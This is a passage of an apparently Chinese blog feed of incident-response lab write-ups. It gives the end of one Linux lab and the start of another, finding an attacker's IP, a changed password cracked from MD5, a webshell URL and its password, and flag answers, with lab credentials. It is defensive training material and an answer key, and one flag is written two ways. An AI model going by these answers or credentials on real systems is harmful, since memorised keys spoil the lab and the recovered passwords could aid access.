&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Linux中&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">local&lt;/span> &lt;span class="nx">用于添加开机启动命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">我们cd&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">下&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">使用ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">la&lt;/span> &lt;span class="err">，&lt;/span>&lt;span class="nx">查看有rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">直接用cat&lt;/span> &lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">local得到第二个flag&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201615.png" alt="Pasted image 20250301201615">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">kfcvme50&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="4-第三个flag">4. 第三个flag&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">我们通过查看log日志&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">我们发现一个redis日志文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">然后看一下redis日志并没有什么结果&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">那么我们去看一下redis配置文件&lt;/span>&lt;span class="err">（&lt;/span>&lt;span class="nx">more&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">redis&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">conf&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">就得到第三个flag&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201639.png" alt="Pasted image 20250301201639">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">ssWrd_redis&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="全部答案">全部答案：&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.75.129&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">thisismybaby&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">kfcvme50&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">ssW0rd_redis&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201658.png" alt="Pasted image 20250301201658">&lt;/p></description></item><item><title>【知攻善防靶场】Linux2</title><link>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux2/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux2/</guid><description>&lt;img src="http://localhost:1313/images/14.webp" alt="Featured image of post 【知攻善防靶场】Linux2" />&lt;h1 id="前提须知">前提须知&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">看监控的时候发现webshell告警&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">领导让你上机检查你可以救救安服仔吗&lt;/span>&lt;span class="err">！！&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交攻击者IP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交攻击者修改的管理员密码&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">明文&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交第一次Webshell的连接URL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交Webshell连接密码&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交数据包的flag1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交攻击者使用的后续上传的木马文件名称&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交攻击者隐藏的flag2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交攻击者隐藏的flag3&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>虚拟机账号/密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">账号&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">密码&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Inch&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">957821.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="1-提交攻击者ip">1. 提交攻击者IP&lt;/h1>
&lt;h3 id="方法一">方法一：&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">首先看一下管理员登录情况&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">确定一下黑客登录IP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">命令&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">last&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wtmp&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015239.png" alt="image.png">&lt;/p>
&lt;h3 id="方法二">方法二：&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">如果不确定的话&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">我们可以登录bt面板看一下&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">这里我看var目录文件时&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">看到了bt配置文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">那就bt看一下&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015259.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">果然安装了宝塔&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">那就登录一下&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">因为不知道面板的密码那我们就直接修改一下面板的密码&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015315.png" alt="image.png">&lt;br>
然后看一下面板的默认信息，看一下url地址&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">外网面板地址&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//58.247.126.6:12485/5a2ce72d&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">内网面板地址&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//192.168.198.130:12485/5a2ce72d&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">username&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">uysycv5w&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">password&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">admin123&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">进行登录&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015356.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015404.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">我们从bt面板里面看到了他添加了一个网站&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">我们去看一下他的日志&lt;/span>&lt;span class="err">（&lt;/span>&lt;span class="nx">这里我就不用宝塔面板中的去查看日志了&lt;/span>&lt;span class="err">），&lt;/span>&lt;span class="nx">我们首先去&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wwwlogs目录下127&lt;/span>&lt;span class="mf">.0.0.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span> &lt;span class="nx">查看一下日志&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用命令&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">cat&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">gerp&lt;/span> &lt;span class="mi">200&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015419.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="mf">192.168.20.1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="2-提交攻击者修改的管理员密码明文">2. 提交攻击者修改的管理员密码(明文)&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">在宝塔面板发现一个phpmyadmin的mysql数据库&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">进管理看数据&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">找密码即可&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015432.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">找到一个x2_user表&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">密码&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">这里使用过的是md5进行加密的&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">不清楚的可以去网上搜一下或者看一下源码&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">md5加密是不可逆的&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">但是可以在网上公开的网站进行解密&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">URL&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//www.somd5.com/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mi">2020&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015447.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015502.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mi">2020&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="3-提交第一次webshell的连接url">3. 提交第一次Webshell的连接URL&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">查看流量包&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">可以看出&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">app&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">register&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015513.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Webshell的连接&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//192.168.198.130/index.php?user-app-register&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="4-提交webshell连接密码">4. 提交Webshell连接密码&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">根据题目3可以看出&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015530.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">webshell密码是&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Network2020&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用蚁剑进行连接&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015548.png" alt="image.png">&lt;/p>
&lt;h1 id="5-提交数据包的flag1">5. 提交数据包的flag1&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ls一下&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">你就会发现默认的文件夹下给了一个流量数据包&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">下载这个数据包使用wireshark进行分析&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span> &lt;span class="p">~]&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">anaconda&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ks&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">cfg&lt;/span> &lt;span class="nx">wp&lt;/span> &lt;span class="nx">数据包1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pcapng&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015601.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">首先&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">过滤一下http报文&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">可以看到这些报文都是攻击者192&lt;/span>&lt;span class="mf">.168.20.1&lt;/span>&lt;span class="nx">在访问Linux主机&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015612.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
